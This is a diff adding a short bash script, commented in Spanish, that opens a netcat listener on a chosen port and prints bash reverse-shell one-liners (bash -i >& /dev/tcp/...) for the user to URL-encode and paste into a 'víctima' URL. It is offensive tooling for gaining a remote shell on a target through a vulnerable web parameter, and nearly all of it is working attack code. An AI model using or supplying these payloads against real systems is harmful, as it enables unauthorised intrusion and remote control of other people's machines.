@@ -1,0 +1,26 @@
+#!/bin/bash
+#
+#ReverseShell en base64.
+#
+#
+
+ipx=`hostname -I`
+
+if [[ -z $1 ]] ; then
+	echo " "
+	echo "[*]base64shell (+) <Puerto escucha>."
+	echo " "
+	exit
+fi
+
+echo " "
+echo "[*]Abriendo puerto de escucha..."
+echo " "
+xterm -e zsh -c "nc -nlvp $1" & 
+echo " "
+echo "[*]Pega esto [bash -i >& /dev/tcp/$ipx/$1 0>&1] en esta URL --> https://www.urlencoder.org/"
+echo " "
+echo "[*]Saca el encode y pégalo en el URL víctima."
+echo " "
+echo '[*]En caso de que no funcione, usar --> [bash -c "bash -i >& /dev/tcp/$ipx/$1 0>&1"] en esta URL --> https://www.urlencoder.org/'
+echo " "
